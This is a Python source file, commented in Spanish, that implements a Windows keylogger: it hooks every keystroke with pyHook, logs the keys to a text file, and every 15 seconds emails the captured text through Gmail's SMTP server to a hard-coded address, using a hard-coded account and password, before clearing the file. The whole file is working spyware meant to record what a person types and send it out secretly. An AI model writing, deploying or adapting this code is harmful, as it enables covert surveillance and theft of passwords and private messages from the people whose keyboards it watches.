import pyHook, pythoncom, logging, time, datetime

#Archivo donde se guardara todo lo que se escriba en el teclado
storage_file = 'C:\\Users\\IEUser\\Desktop\\Proyectos\\Data.txt'
#Tiempo en segundos de intervalo
wait_time = 15
#Tiempo real en el que se va a enviar el mensaje
timeOut = time.time() + wait_time

#Funcion que determina si se puede mandar el mensaje o no
def TimeOut():
    if time.time() > timeOut:
        return True
    else:
        return False

#Funcion que envia el correo subject=tema
def SendEmail(user, password, recipient, subject, body):
    #Importamos smtplib que utiliza el protocolo smtp para enviar mensajes
    import smtplib
    #Igualamos las variables
    gmail_user = user
    gmail_password = password
    From = user
    To = recipient
    Subject = subject
    Text = body
    #Formamos el mensaje que se enviara por el servidor
    message = """\From: %s\nTo: %s\nSubject: %s\n\n%s""" % (From, To, Subject, Text)

    try:
        #Asignamos el dominio de Gmail smtp y el puerto a la variable que sera como el servidor
        server = smtplib.SMTP("smtp.gmail.com", 587)
        #Nos identificamos 
        server.ehlo()
        #Ciframos el mensaje
        server.starttls()
        #Login de la cuenta Gmail desde donde se enviara el mensaje
        server.login(gmail_user, gmail_password)
        #Enviamos el mensaje
        server.sendmail(From, To, message)
        #Cerramos la conexion
        server.close()
        #Mensaje de confirmacion
        print("Correo enviado correctamente")
    except:
        #Mensaje de error
        print("Error al mandar correo")

#Funcion que da forma al correo y envia el texto del archivo txt
def FormatAndSendEmail():
    #Abrimos el archivo txt para lectura y escritura
    with open(storage_file, 'r+') as f:
        #Obtenemos la fecha actual en que se manda la informacion
        actualDate = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        #Leemos el contenido y reemplazamos 'Space' por un espacio y quitamos los saltos de linea
        data = f.read().replace('Space', ' ').replace('\n', '')
        #Forma del mensaje que aparece en el correo
        data = 'Log capturado a las: '+ actualDate + '\n' + data
        #Enviamos el correo
        SendEmail('pablitoCla25@gmail.com', '123456789#$', 'pablitoCla25@gmail.com', 'Nuevo log - ' + actualDate, data)
        #Limpiamos el contenido en el archivo txt para capturar nuevos registros
        f.seek(0)
        f.truncate()

#Funcion que guarda un evento(tecla presionada) y lo guardara en el archivo
def KeyRecord(key):
    #Configuramos colocando el archivo destino, determinamos que se realice en un nivel de 
    #depuracion y colocamos el formato en el que se va a guardar los eventos que serian strings
    logging.basicConfig(filename=storage_file, level=logging.DEBUG, format='%(message)s')
    #Se envia al archivo el caracter seleccionado con el teclado en el nivel 10 que equivale al modo depuracion
    logging.log(10, key.Key)
    return True

#Se crea un gestor que ejecutaran llamadas para el registro de eventos del teclado
hooks_manage = pyHook.HookManager()
#Hacemos que este a la escucha de los eventos del teclado que sean precionar una tecla hacia abajo
hooks_manage.KeyDown = KeyRecord
#Hacemos que se vigile los eventos del teclado
hooks_manage.HookKeyboard()

#Creamos un bucle infinito para que el programa siempre este capturando eventos
while True:
    #Condicionamos si ya es tiempo de mandar el mensaje
    if TimeOut():
        #Mandamos el mensaje
        FormatAndSendEmail()
        #Asignamos 15 segundos mas para que capture los eventos
        timeOut = time.time() + wait_time

    #Ejecuta los mensajes que estan en espera
    pythoncom.PumpWaitingMessages()